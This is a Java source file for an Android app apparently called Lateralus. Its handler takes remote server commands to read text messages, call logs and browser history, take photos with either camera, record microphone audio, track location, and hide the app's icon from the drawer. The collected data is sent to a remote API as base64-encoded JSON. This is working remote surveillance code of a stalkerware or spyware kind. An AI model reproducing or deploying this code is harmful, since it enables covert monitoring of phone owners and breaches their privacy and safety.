package xyz.lateralus.components;


import android.content.Context;
import android.location.Location;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import xyz.lateralus.components.audio.AudioRecorder;
import xyz.lateralus.components.audio.AudioRecorderDelegate;
import xyz.lateralus.components.camera.PhotoTaker;
import xyz.lateralus.components.camera.PhotoTakerDelegate;
import xyz.lateralus.components.location.LocatorDelegate;
import xyz.lateralus.components.location.Locator;
import xyz.lateralus.components.network.LateralusNetwork;
import xyz.lateralus.components.readers.DataReader;
import xyz.lateralus.components.readers.DeviceReader;
import xyz.lateralus.components.readers.InternetHistoryReader;
import xyz.lateralus.components.readers.PhonecallReader;
import xyz.lateralus.components.readers.TextMessageReader;

import org.json.JSONException;
import org.json.JSONObject;


public class LateralusMessageHandler {
    private static final String TAG = "LateralusMsgHandler";

    public static final String KEY_ROOT      = "json";
    public static final String KEY_CMD       = "command";
    public static final String KEY_PHOTO     = "photo";
    public static final String KEY_AUDIO     = "audio_recording";
    public static final String KEY_MSG       = "message";
    public static final String KEY_ERROR_MSG = "error_message";
    public static final String KEY_MSG_ID    = "message_id";

    public static final String CMD_GET_TEXT_MESSAGES = "get_text_messages";
    public static final String CMD_GET_PHONECALLS    = "get_phonecalls";
    public static final String CMD_GET_INTERNET_HIST = "get_internet_history";
    public static final String CMD_TAKE_PIC_FRONT    = "take_picture_front";
    public static final String CMD_TAKE_PIC_BACK     = "take_picture_back";
    public static final String CMD_GET_LOCATION      = "get_location";
    public static final String CMD_START_TRACKING    = "start_tracking";
    public static final String CMD_STOP_TRACKING     = "stop_tracking";
    public static final String CMD_RECORD_AUDIO      = "record_audio";
    public static final String CMD_SHOW_APP          = "show_app";
    public static final String CMD_HIDE_APP          = "hide_app";

    private Context _ctx;
    private LateralusPreferences _prefs;
    private static Handler _handler;

    private static Locator     _locator = null;
    private static LocDelegate _locDelegate = null;

    private static PhotoTaker    _photoTaker = null;
    private static PhotoDelegate _photoDelegate = null;

    private static AudioRecorder _audioRecorder = null;
    private static AudioDelegate _audioDelegate = null;

    public LateralusMessageHandler(Context ctx){
        _ctx = ctx;
        _prefs = new LateralusPreferences(ctx);
        if(_handler == null){
            _handler = new Handler(Looper.getMainLooper());
        }
    }

    public void onMessageReceived(JSONObject data){
        try{
            String cmd = data.getString(KEY_CMD);

            // TODO: check for empty commands
            // TODO: take in a message id

            // commands that don't send data
            if(CMD_SHOW_APP.equals(cmd) || CMD_HIDE_APP.equals(cmd)){
                cmdAppDrawer(cmd);
            }

            // commands that send data
            if(_prefs.useWifiOnly() && !Utils.isWiFiConnected(_ctx)){
                sendLateralusErrorMessage(_ctx, "Permission Denied: Wifi Only - wifi is not connected");
                return;
            }

            switch(cmd) {
                case CMD_GET_TEXT_MESSAGES:
                    cmdGetTextMessages();
                    break;
                case CMD_GET_PHONECALLS:
                    cmdGetPhonecalls();
                    break;
                case CMD_GET_INTERNET_HIST:
                    cmdGetInternetHistory();
                    break;
                case CMD_TAKE_PIC_FRONT:
                case CMD_TAKE_PIC_BACK:
                    cmdTakePicture(cmd);
                    break;
                case CMD_GET_LOCATION:
                case CMD_START_TRACKING:
                case CMD_STOP_TRACKING:
                    cmdLocation(cmd);
                    break;
                case CMD_RECORD_AUDIO:
                    cmdRecordAudio();
                default:
                    Log.e(TAG, "Invalid Command: " + cmd);
                    //sendLateralusErrorMessage(_ctx, "Invalid command from server: " + cmd);
            }

        }
        catch(JSONException e){
            Log.e(TAG, "JSON Error from GCM request");
            e.printStackTrace();
        }
    }

    /* -------- Commands -------- */

    private void cmdGetTextMessages(){
        if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_MESSAGES)){
            sendLateralusErrorMessage(_ctx, "Permission Denied: Messages");
            return;
        }
        try {
            JSONObject root = new JSONObject();

            // device info
            DataReader dr = new DeviceReader(_ctx);
            root.put(dr.getRootKey(), dr.getData());

            // messages
            dr = new TextMessageReader(_ctx);
            root.put(dr.getRootKey(), dr.getData());

            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    private void cmdGetPhonecalls(){
        if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_PHONE_LOGS)){
            sendLateralusErrorMessage(_ctx, "Permission Denied: Phone Logs");
            return;
        }
        try{
            JSONObject root = new JSONObject();

            // device info
            DataReader dr = new DeviceReader(_ctx);
            root.put(dr.getRootKey(), dr.getData());

            // phonecalls
            dr = new PhonecallReader(_ctx);
            root.put(dr.getRootKey(), dr.getData());

            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    private void cmdGetInternetHistory(){
        if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_CHROME_HIST)){
            sendLateralusErrorMessage(_ctx, "Permission Denied: Chrome History");
            return;
        }
        try{
            JSONObject root = new JSONObject();

            // device info
            DataReader dr = new DeviceReader(_ctx);
            root.put(dr.getRootKey(), dr.getData());

            // history
            dr = new InternetHistoryReader(_ctx);
            root.put(dr.getRootKey(), dr.getData());

            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    private void cmdAppDrawer(final String cmd){
        _handler.post(new Runnable() {
            @Override
            public void run() {
                if(cmd.equals(CMD_SHOW_APP)){
                    Utils.showAppInDrawer(_ctx);
                }
                else{
                    Utils.hideAppInDrawer(_ctx);
                }
            }
        });
    }

    private void cmdTakePicture(final String cmd){
        if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_CAMERA)){
            sendLateralusErrorMessage(_ctx, "Permission Denied: Camera");
            return;
        }
        if(_photoDelegate == null){
            _photoDelegate = new PhotoDelegate();
        }
        _handler.post(new Runnable() {
            @Override
            public void run() {
                if(_photoTaker == null) {
                    _photoTaker = new PhotoTaker(_ctx, _photoDelegate);
                }
                _photoTaker.takePhoto((cmd.equals(CMD_TAKE_PIC_FRONT)) ? PhotoTaker.FRONT : PhotoTaker.BACK);
            }
        });
    }

    private void cmdRecordAudio() {
        if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_MICROPHONE)){
            sendLateralusErrorMessage(_ctx, "Permission Denied: Microphone");
            return;
        }
        try {
            final int durationSeconds = 60; // TODO: allow custom duration
            _handler.post(new Runnable() {
                @Override
                public void run() {
                    if(_audioRecorder == null) {
                        _audioDelegate = new AudioDelegate();
                        _audioRecorder = new AudioRecorder(_audioDelegate);
                    }
                    _audioRecorder.startRecordingMic(durationSeconds);
                }
            });
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error could not read extra data");
            e.printStackTrace();
        }
    }

    private void cmdLocation(final String cmd){
        if(!_prefs.hasDataPermission(LateralusPreferences.PERMISSION_LOCATION)){
            sendLateralusErrorMessage(_ctx, "Permission Denied: Location");
            return;
        }
        _handler.post(new Runnable() {
            @Override
            public void run() {
                if(_locDelegate == null || _locator == null){
                    _locDelegate = new LocDelegate();
                    _locator = new Locator(_ctx, _locDelegate);
                }
                switch(cmd){
                    case CMD_GET_LOCATION:
                        _locator.requestSingleLocationUpdate();
                        break;
                    case CMD_START_TRACKING:
                        _locator.startTracking();
                        break;
                    case CMD_STOP_TRACKING:
                        _locator.stopTracking();
                        _locDelegate = null;
                        _locator = null;
                        break;
                }
            }
        });
    }

    /* -------- Send Messages -------- */

    public static void sendLateralusMessage(Context ctx, String msg){
        try{
            JSONObject root = new JSONObject();

            // device info
            DataReader dr = new DeviceReader(ctx);
            root.put(dr.getRootKey(), dr.getData());

            // error msg
            root.put(KEY_MSG, msg);

            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    public static void sendLateralusErrorMessage(Context ctx, String msg){
        try{
            JSONObject root = new JSONObject();

            // device info
            DataReader dr = new DeviceReader(ctx);
            root.put(dr.getRootKey(), dr.getData());

            // error msg
            root.put(KEY_ERROR_MSG, msg);

            LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
        }
        catch(Exception e){
            Log.e(TAG, "JSON Error");
            e.printStackTrace();
        }
    }

    /* --------- Location Delegate -------- */

    private class LocDelegate implements LocatorDelegate {

        @Override
        public void onLocationReceived(Location loc) {
            try {
                JSONObject jsonLoc = Locator.getJsonFromLocation(loc);
                if(jsonLoc != null) {
                    JSONObject root = new JSONObject();

                    // device info
                    DataReader dr = new DeviceReader(_ctx);
                    root.put(dr.getRootKey(), dr.getData());

                    // location
                    root.put(Locator.getRootKey(), jsonLoc);

                    LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
                }
            }
            catch(Exception e){
                Log.e(TAG, "JSON Error");
                e.printStackTrace();
            }
        }

        @Override
        public void onErrorReceived(String msg) {
            sendLateralusErrorMessage(_ctx, msg);
        }

        @Override
        public void onMessageReceived(String msg) {
            sendLateralusMessage(_ctx, msg);
        }
    }

    /* ------- Photo Taker Delegate -------- */

    private class PhotoDelegate implements PhotoTakerDelegate {

        @Override
        public void onPhotoTaken(byte[] photoBytes) {
            try {
                JSONObject root = new JSONObject();

                // device info
                DataReader dr = new DeviceReader(_ctx);
                root.put(dr.getRootKey(), dr.getData());

                // photo
                String photoStr = Base64.encodeToString(photoBytes, Base64.DEFAULT);
                root.put(KEY_PHOTO, photoStr);

                LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
            }
            catch(Exception e){
                Log.e(TAG, "JSON Error");
                e.printStackTrace();
            }
        }

        @Override
        public void onError(String msg) {
            sendLateralusErrorMessage(_ctx, msg);
        }
    }

    /* -------- Audio Recorder Delegate -------- */

    private class AudioDelegate implements AudioRecorderDelegate{

        @Override
        public void onErrorMessage(String msg) {
            sendLateralusErrorMessage(_ctx, msg);
        }

        @Override
        public void onFinishedRecording(byte[] audioBytes) {
            try {
                JSONObject root = new JSONObject();

                // device info
                DataReader dr = new DeviceReader(_ctx);
                root.put(dr.getRootKey(), dr.getData());

                // audio
                String audioStr = Base64.encodeToString(audioBytes, Base64.NO_WRAP);
                root.put(KEY_AUDIO, audioStr);

                LateralusNetwork.sendJsonData(LateralusNetwork.API_PUT, new JSONObject().put(KEY_ROOT, root), null);
            }
            catch(Exception e){
                Log.e(TAG, "JSON Error");
                e.printStackTrace();
            }
        }
    }

}
